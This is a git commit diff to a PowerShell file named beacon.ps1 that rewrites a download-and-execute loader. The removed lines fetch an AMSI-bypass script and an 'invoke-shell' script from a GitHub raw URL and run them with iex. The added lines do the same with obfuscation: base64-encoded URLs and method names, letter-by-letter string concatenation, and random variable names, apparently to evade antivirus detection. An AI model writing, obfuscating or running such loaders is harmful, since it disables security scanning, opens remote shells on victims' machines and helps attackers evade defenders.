fbd70260526e29daf7ca58701458258d3203e45b
eytestingct-jpg <eytestingct@gmail.com>
2025-09-19 04:08:20 +0530

    Update beacon.ps1

--- beacon.ps1
+++ beacon.ps1
@@ -1,4 +1,9 @@
-$amsiBypass = "https://raw.githubusercontent.com/eytestingct-jpg/Toolies/refs/heads/main/amsi-bypass.ps1"
-iex(New-Object Net.WebClient).DownloadString($amsiBypass)
-$invokeBeacon = "https://raw.githubusercontent.com/eytestingct-jpg/Toolies/refs/heads/main/invoke-shell.ps1"
-iex(New-Object Net.WebClient).DownloadString($invokeBeacon)
+${env:ComSpec}[-($((6,8,9)|Get-Random)..-2)] -join '' | % { $vX3qW9z = $_ }
+${env:ProgramData}[-((${(Get-Random -Minimum 3 -Maximum 7)})..-1)] -join '' | % { $hR7mK2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9hbXNpLWJ5cGFzcy5wczE=')) }
+${env:Temp}[-($((2,4,6)|Get-Random)..-1)] -join '' | % { $jP9nT4 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V5dGVzdGluZ2N0LWpwZy9Ub29saWVzL3JlZnMvaGVhZHMvbWFpbi9pbnZva2Utc2hlbGwucHMx')) }
+${vX3qW9z} -eq 'powershell' | % { $zQ5kL8 = &('N'+'e'+'w'+'-'+'O'+'b'+'j'+'e'+'c'+'t') ('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'W'+'e'+'b'+'C'+'l'+'i'+'e'+'n'+'t') }
+if($zQ5kL8) { $bM2vY6 = $zQ5kL8.([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RG93bmxvYWRTdHJpbmc='))).Invoke(${hR7mK2}) }
+if($bM2vY6) { &([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b2tlLUV4cHJlc3Npb24='))) ${bM2vY6} }
+${vX3qW9z} -eq 'powershell' | % { $xW1tJ3 = &('N'+'e'+'w'+'-'+'O'+'b'+'j'+'e'+'c'+'t') ('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'W'+'e'+'b'+'C'+'l'+'i'+'e'+'n'+'t') }
+if($xW1tJ3) { $rN6pZ2 = $xW1tJ3.([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RG93bmxvYWRTdHJpbmc='))).Invoke(${jP9nT4}) }
+if($rN6pZ2) { &([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b2tlLUV4cHJlc3Npb24='))) ${rN6pZ2} }
